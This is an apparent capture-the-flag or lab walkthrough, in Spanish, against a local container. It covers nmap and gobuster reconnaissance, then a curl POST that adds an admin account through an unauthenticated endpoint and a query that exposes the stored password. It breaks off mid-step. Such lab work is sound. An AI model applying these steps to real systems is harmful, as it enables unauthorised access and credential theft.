1. Comprobación de Conectividad

ping 172.17.0.2

2. Escaneo de Puertos Abiertos

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

✅ Puertos abiertos detectados:

    22/tcp → SSH
    5000/tcp → upnp

3. Detección de Versiones de Servicios

nmap -p22,80 -sCV 172.17.0.2

Resultados:

    22/tcp → OpenSSH 8.4p1 Debian 5+deb11u4 (protocol 2.0)
    5000/tcp

4. Enumeración de Directorios vía HTTP

gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt

📂 Directorios/Rutas encontradas:

/add                  (Status: 405) [Size: 178]
/console              (Status: 400) [Size: 192]

viendo estas oportunidades utilice el siguiente comando para ver si podia aniadir usuarios

curl -X POST -d "username=admin&password=123" http://172.17.0.2:5000/add                              

{
  "message": "User added"
}

ahora tengo un usuario del cual conosco el nombre y la contrasenia

dentro del navegador intento buscar el usuario admin

http://172.17.0.2:5000/users?username=admin

	
0	
0	3
1	"admin"
2	"123"

entonces utilizo



